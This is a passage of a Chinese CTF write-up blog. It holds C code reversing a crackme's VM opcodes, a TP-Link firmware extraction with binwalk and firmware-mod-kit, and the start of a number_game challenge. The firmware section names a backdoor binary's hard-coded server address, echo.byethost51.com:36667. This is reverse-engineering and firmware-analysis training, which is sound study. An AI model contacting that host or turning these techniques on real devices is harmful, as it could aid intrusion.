class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *str = (<span class="keyword">int</span> *)ida_chars;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 100; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, str[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    vm_operad(str, <span class="number">114</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x22 0x3f 0x34 0x32 0x72 0x33 0x18 0xffffffa7 0x31 0xfffffff1 0x28 0xffffff84 0xffffffc1 0x1e 0x7a </span><br><span class="line">顺序:</span><br><span class="line">1, 3, 4, 6, 7, 9, 10, 12, 13, 15, 16, 17, 18, 19, 20, 22, 23, 25, 26, 28, 29, 30, 31, 32, 33, 35, 36, 38, 39, 41, 42, 44, 45, 46, 47, 48, 49, 51, 52, 54, 55, 57, 58, </span><br><span class="line">60, 61, 63, 64, 66, 67, 69, 70, 72, 73, 75, 76, 78, 79, 81, 82, 83, 84, 86, 88, 90, 92, 94, 96, 98, 100, 102, 104, 106, 108, 110, 112, 114,</span><br></pre></td></tr></table></figure><p>正好比较了15次。</p><p>现在知道了执行顺序以及有关flag的关键信息。逆着走一遍就好：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_decode</span><span class="params">(<span class="keyword">int</span> *opcode,<span class="keyword">int</span> len_114)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> order[<span class="number">100</span>] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">88</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">104</span>, <span class="number">106</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>&#125;;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> v4[] = &#123;<span class="number">0x22</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0xffffffa7</span>, <span class="number">0x31</span>, <span class="number">0xfffffff1</span>, <span class="number">0x28</span>, <span class="number">0xffffff84</span>, <span class="number">0xffffffc1</span>, <span class="number">0x1e</span>, <span class="number">0x7a</span>&#125;;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;&#125;; <span class="comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> z; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> x; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line">  x = <span class="number">15</span>;</span><br><span class="line">  z = <span class="number">15</span>;</span><br><span class="line">  m = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="built_in">strlen</span>(order) - <span class="number">1</span>;k&gt;=<span class="number">0</span>;k--)<span class="comment">//从后往前</span></span><br><span class="line">  &#123;</span><br><span class="line">i = order[k];</span><br><span class="line">    <span class="keyword">switch</span> ( opcode[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--x;</span><br><span class="line">--z;</span><br><span class="line">        v5 = v4[z];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        flag[x] = v5 - opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        flag[x] = v5 + opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        flag[x] = v5 ^ opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        flag[x] = v5 / opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v5 = flag[--m];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        flag[x] = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        flag[x] = v5 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>太不熟了。。</p><h1 id="0x22-firmware"><a href="#0x22-firmware" class="headerlink" title="0x22.firmware"></a>0x22.firmware</h1><p>binwalk提取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ binwalk -e 51475f91-7b90-41dd-81a3-8b82df4f29d0.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             TP-Link firmware header, firmware version: 1.-20432.3, image version: <span class="string">&quot;&quot;</span>, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0</span><br><span class="line">69424         0x10F30         Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 64</span><br><span class="line">94080         0x16F80         U-Boot version string, <span class="string">&quot;U-Boot 1.1.4 (Aug 26 2013 - 09:07:51)&quot;</span></span><br><span class="line">94256         0x17030         CRC32 polynomial table, big endian</span><br><span class="line">131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: <span class="string">&quot;&quot;</span>, product ID: 0x0, product version: 155254791, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 772784, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0</span><br><span class="line">132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2203728 bytes</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span>: [Errno 2] No such file or directory: <span class="string">&#x27;sasquatch&#x27;</span>, <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span> might not be installed correctly</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">&#x27;sasquatch -p 1 -be -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span>: [Errno 2] No such file or directory: <span class="string">&#x27;sasquatch&#x27;</span>, <span class="string">&#x27;sasquatch -p 1 -be -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span> might not be installed correctly</span><br><span class="line">1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2774624 bytes, 519 inodes, blocksize: 131072 bytes, created: 2015-04-13 09:35:04</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几个文件，其中</p><blockquote><p>  SquashFS 是一套基于Linux内核使用的压缩只读文件系统</p></blockquote><p>需要用到 <strong>firmware-mod-kit</strong>解压，安装方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"><span class="built_in">cd</span> firmware-mod-kit/src</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>解压文件系统：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop/_51475f91-7b90-41dd-81a3-8b82df4f29d0.bin.extracted$ /home/gwt/firmware-mod-kit/unsquashfs_all.sh  120200.squashfs </span><br><span class="line">/home/gwt/firmware-mod-kit/unsquashfs_all.sh: line 85: ./src/binwalk: No such file or directory</span><br><span class="line">Attempting to extract SquashFS .X file system...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying ./src/squashfs-2.1-r2/unsquashfs... </span><br><span class="line">Trying ./src/squashfs-2.1-r2/unsquashfs-lzma... </span><br><span class="line">Trying ./src/squashfs-3.0/unsquashfs... </span><br><span class="line">Trying ./src/squashfs-3.0/unsquashfs-lzma... </span><br><span class="line">Trying ./src/squashfs-3.0-lzma-damn-small-variant/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-2.0-nb4/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.0-e2100/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.0-e2100/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-lzma/squashfs3.2-r2/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-hg612-lzma/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-wnr1000/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.2-r2-rtn12/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3-lzma/squashfs3.3/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.3-grml-lzma/squashfs3.3/squashfs-tools/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-cisco/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-nb4/unsquashfs... </span><br><span class="line">Trying ./src/others/squashfs-3.4-nb4/unsquashfs-lzma... </span><br><span class="line">Trying ./src/others/squashfs-4.2-official/unsquashfs... Parallel unsquashfs: Using 1 processor</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2/unsquashfs... Parallel unsquashfs: Using 1 processor</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.0-lzma/unsquashfs-lzma... Parallel unsquashfs: Using 1 processor</span><br><span class="line">480 inodes (523 blocks) to write</span><br><span class="line"></span><br><span class="line">[==================================================================================================-               ] 454/523  86%</span><br><span class="line">created 341 files</span><br><span class="line">created 39 directories</span><br><span class="line">created 70 symlinks</span><br><span class="line">created 0 devices</span><br><span class="line">created 0 fifos</span><br><span class="line">File system sucessfully extracted!</span><br><span class="line">MKFS=<span class="string">&quot;./src/others/squashfs-4.0-lzma/mksquashfs-lzma&quot;</span></span><br></pre></td></tr></table></figure><p>找到backdoor文件，去upx壳，然后直接找到：<code>echo.byethost51.com:36667</code></p><h1 id="0x23-GUET-CTF2019-number-game-未完，记得动调"><a href="#0x23-GUET-CTF2019-number-game-未完，记得动调" class="headerlink" title="0x23.[GUET-CTF2019]number_game(未完，记得动调)"></a>0x23.[GUET-CTF2019]number_game(未完，记得动调)</h1><p>先看了下流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  __int16 v8; <span 